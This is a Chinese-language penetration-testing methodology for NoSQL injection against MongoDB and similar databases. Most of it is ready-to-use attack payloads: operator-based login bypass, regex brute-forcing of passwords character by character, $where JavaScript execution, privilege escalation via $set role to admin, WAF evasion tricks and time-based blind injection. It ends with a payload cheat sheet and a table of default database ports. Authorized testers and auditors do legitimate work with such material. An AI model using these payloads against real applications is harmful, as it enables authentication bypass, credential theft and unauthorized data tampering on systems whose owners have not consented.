# NoSQL 注入攻击方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供一套标准化、可复现的 NoSQL 注入测试与利用流程，帮助识别和利用 MongoDB、Redis、CouchDB 等 NoSQL 数据库的注入漏洞，确保测试的深度和广度。

## 1.2 适用范围
适用于使用 NoSQL 数据库的 Web 应用、API 接口，尤其是那些未对用户输入进行严格过滤的业务系统，如用户认证、搜索功能、数据查询等。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师，以及负责代码审计的开发人员。

---

# 第二部分：核心渗透技术专题

## 专题：NoSQL 注入攻击

### 2.1 技术介绍

NoSQL 注入是指攻击者通过构造恶意输入，操纵 NoSQL 数据库查询逻辑，从而绕过认证、提取数据或修改数据的攻击方式。

**与 SQL 注入的区别：**
- NoSQL 使用不同的查询语法（如 MongoDB 的 BSON 查询）
- NoSQL 支持更丰富的操作符（`$where`、`$gt`、`$ne` 等）
- NoSQL 查询通常以 JSON/BSON 格式传递

**常见漏洞函数：**
| 数据库 | 危险操作 | 说明 |
|--------|---------|------|
| MongoDB | `$where` | 执行 JavaScript 代码 |
| MongoDB | `$regex` | 正则表达式匹配 |
| MongoDB | `mapReduce` | 执行 MapReduce 任务 |
| Redis | `EVAL` | 执行 Lua 脚本 |
| CouchDB | `_view` | 执行视图函数 |

### 2.2 攻击常见业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **用户认证** | 登录、密码重置 | 用户名/密码参数使用 NoSQL 查询，可被操作符绕过 |
| **搜索功能** | 商品搜索、用户搜索 | 搜索关键词直接拼接到查询条件中 |
| **API 接口** | RESTful API、GraphQL | JSON 请求体中的字段可控 |
| **数据导出** | 报表生成、数据下载 | 查询条件参数未过滤操作符 |
| **管理后台** | 用户管理、订单查询 | 筛选条件直接使用用户输入 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**输入点识别：**
- JSON 请求体中的所有字段
- URL 查询参数
- POST 表单数据
- HTTP 请求头（如 Authorization）

**初步探测 Payload：**

```
# 基础布尔测试
username[$ne]=test&password[$ne]=test

# 数组注入
username[$in]=admin&username[$in]=test

# 正则匹配
username[$regex]=adm

# 始终为真
username[$gt]=

# MongoDB $where 注入
username[$where]=this.username.length>0
```

**响应判断：**
- 返回数据量异常增加
- 认证被绕过（返回成功）
- 出现数据库错误信息
- 响应时间异常

#### 2.3.2 白盒测试

**代码审计关键词：**
- `db.collection.find()`
- `db.collection.findOne()`
- `$where` 查询
- 用户输入直接拼接到查询对象

**危险模式示例（Node.js）：**
```javascript
// 危险代码
db.users.findOne({ username: req.body.username, password: req.body.password })

// 攻击者输入：username[$ne]=test&password[$ne]=test
// 实际查询：{ username: { $ne: 'test' }, password: { $ne: 'test' } }
```

### 2.4 漏洞利用方法

#### 2.4.1 认证绕过

```
# 登录绕过（MongoDB）
username[$ne]=test&password[$ne]=test

# 或
username[$in]=admin&password[$ne]=wrongpass

# 或（JSON 格式）
{"username": {"$ne": null}, "password": {"$ne": null}}
```

#### 2.4.2 数据提取

```
# 字段枚举
{"$where": "this.password.match(/^a/)"}

# 逐字符爆破密码
username[$regex]=^a.*
username[$regex]=^ad.*
username[$regex]=^adm.*

# 提取所有文档
{"$where": "return true"}
```

#### 2.4.3 数据修改

```
# 更新操作注入
{"$set": {"role": "admin", "isVerified": true}}

# 删除操作
{"$unset": {}}
```

#### 2.4.4 JavaScript 代码执行（$where）

```
# MongoDB $where 注入
{"$where": "db.getSiblingDB('admin').getCollectionNames()"}

# 读取其他集合数据
{"$where": "return db.users.find().toArray()"}
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过类型检查

```
# 如果后端期望字符串
username[$regex]=^admin

# 如果后端进行类型转换
username[$eq]=1  # 数字 1 可能被转换为 "1"
```

#### 2.5.2 绕过 WAF 过滤

```
# 使用 Unicode 编码
username[\u0024ne]=test

# 使用嵌套操作符
username[$or][0][$ne]=test

# 使用数组语法
username[$in][0]=admin
```

#### 2.5.3 盲注利用

当无直接回显时，使用时间延迟或条件响应：

```
# 条件响应盲注
{"$where": "this.password[0] === 'a'"}

# 时间延迟（需要 JavaScript 执行）
{"$where": "if(this.password[0]=='a'){ sleep(5000) }"}
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | Payload | 说明 |
|-----|---------|------|
| **认证绕过** | `{$ne: null}` | 不等于 null，始终为真 |
| **认证绕过** | `{$in: [val1, val2]}` | 在指定值列表中 |
| **数据提取** | `{$regex: ^abc}` | 正则匹配，用于逐字符爆破 |
| **数据提取** | `{$where: 'return true'}` | 返回所有文档 |
| **代码执行** | `{$where: 'db.get...()'}` | 执行任意 JS |
| **逻辑操作** | `{$or: [{cond1}, {cond2}]}` | 或逻辑 |
| **逻辑操作** | `{$and: [...]}` | 与逻辑 |

## 3.2 NoSQL 数据库默认端口

| 数据库 | 默认端口 | 管理界面 |
|-------|---------|---------|
| MongoDB | 27017 | - |
| Redis | 6379 | - |
| CouchDB | 5984 | /_utils |
| Elasticsearch | 9200 | /_plugin/head |
| Cassandra | 9042 | - |

## 3.3 参考资源

- [OWASP NoSQL Injection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
- [MongoDB Security Documentation](https://www.mongodb.com/docs/manual/security/)
- [PortSwigger - NoSQL Injection](https://portswigger.net/web-security/nosql-injection)
